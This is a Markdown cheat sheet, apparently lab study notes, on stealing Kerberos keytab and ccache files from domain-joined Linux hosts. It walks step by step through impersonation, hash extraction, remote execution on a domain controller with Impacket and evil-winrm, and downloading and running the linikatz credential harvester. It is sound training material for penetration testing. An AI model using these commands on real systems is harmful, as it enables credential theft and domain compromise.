# Pass the Ticket form Linux
**Concept:** Linux machines joined to AD store Kerberos tickets in files (`ccache`) or keytables (`keytab`). If we compromise the machine (especially as root), we can steal these files and use them to authenticate to other services (SMB, SSH, MSSQL) without knowing the user's password. **Requirement:** The target machine must be domain-joined.
## 1. Ticket Storage & Discovery
**Goal:** Locate where the Kerberos artifacts are stored.

| **Type**   | **Description**                                                                                         | **Default Location**                                     |
| ---------- | ------------------------------------------------------------------------------------------------------- | -------------------------------------------------------- |
| *CCache* | **Credential Cache.** Stores active TGTs for logged-in users. Temporary and expires (usually 10 hours). | `/tmp/krb5cc_%UID%` (e.g., `/tmp/krb5cc_1000`)           |
| *Keytab* | **Key Table.** Stores encrypted keys (derived from passwords) for services or scripts. **Persistent.**  | `/etc/krb5.keytab` (System) or custom paths in cronjobs. |
**Enumeration:**
```shell
# Check if the machine is domain joined
realm list

# Find Keytab files (Look for non-standard locations)
find / -name "*.keytab" -ls 2>/dev/null

# Find CCache files (Look for temp files owned by domain users)
ls -la /tmp/krb5cc*
```
## 2. Abusing Keytab Files
**Scenario:** You find a `backup.keytab` file used by a script to copy files to a Windows share. 
**Value:** Keytabs allow you to request a fresh TGT anytime. They do not expire like CCache files.
### A. Impersonation (Using `kinit`)
**Goal:** Use the keytab to authenticate as the user and get a valid ticket.
1. **Identify the Principal:**
    ```shell
    # List who owns this keytab
    klist -k -t /opt/specialfiles/carlos.keytab
    ```
2. **Import & Authenticate:**
    ```shell
    # Request a TGT for 'carlos' using the keytab
    # Note: Domain/Realm must usually be UPPERCASE
    kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab
    ```
3. **Verify:**    
    ```shell
    # Check if we have a ticket now
    klist
    ```
4. **Execute:**
    ```shell
    # Access a remote share using Kerberos (-k)
    smbclient //dc01/carlos -k -c ls
    ```
### B. Hash Extraction (KeyTabExtract)
**Goal:** Extract the NTLM hash from the keytab file to use with Pass-the-Hash or crack it offline.
```shell
# Tool: KeyTabExtract.py (Download from GitHub)
python3 keytabextract.py /opt/specialfiles/carlos.keytab

# Output:
# [*] RC4-HMAC hash: a738f92b3c08b424ec2d99589a9cce60
```
## 3. Abusing CCache Files
**Scenario:** A Domain Admin is currently logged into this Linux server (SSH). You see their ticket in `/tmp`. 
**Goal:** Steal their session ticket.
### Harvesting & Impersonating
1. **Steal:** Copy the ticket to a place you control.
    ```shell
    # Must be root to read other users' tickets
    cp /tmp/krb5cc_647401106_I8I133 /tmp/stolen_ticket
    ```
2. **Import:** Point the `KRB5CCNAME` environment variable to the file.    
    ```shell
    export KRB5CCNAME=/tmp/stolen_ticket
    ```
3. **Verify:**
    ```shell
    klist
    # Result: Valid ticket for administrator@INLANEFREIGHT.HTB
    ```
4. **Use:**
    ```shell
    # Dump the Domain Controller's C$ share
    # -k: Use Kerberos | -no-pass: Don't ask for password
    smbclient //dc01/C$ -k -c ls -no-pass
    ```
## 4. Tooling (Impacket & Evil-WinRM)
**Context:** Many tools support Kerberos authentication if the environment variable is set.
**Impacket (Remote Execution):**
```shell
# Export the ticket first
export KRB5CCNAME=/tmp/stolen_ticket

# Connect via WMI
# -k: Use Kerberos auth from the env var
impacket-wmiexec -k -no-pass dc01.inlanefreight.htb
```

**Evil-WinRM:**
```shell
# Requires 'krb5-user' package installed
# -r: Realm (Domain)
evil-winrm -i dc01 -r inlanefreight.htb
```
## 5. Ticket Conversion (Linux <-> Windows)
**Context:** You stole a `ccache` file from Linux, but you want to use it on a Windows machine with Mimikatz (which uses `.kirbi` format).
**Tool:** `impacket-ticketConverter`
```shell
# Convert Linux (ccache) -> Windows (kirbi)
impacket-ticketConverter stolen.ccache stolen.kirbi

# Convert Windows (kirbi) -> Linux (ccache)
impacket-ticketConverter stolen.kirbi stolen.ccache
```
## 6. Automated Harvesting (Linikatz)
**Tool:** `Linikatz.sh` 
**Role:** The "Mimikatz of Linux." It automates scanning `/tmp`, `/var/run`, and keytabs to extract credentials and tickets.
```shell
wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh
chmod +x linikatz.sh
./linikatz.sh
```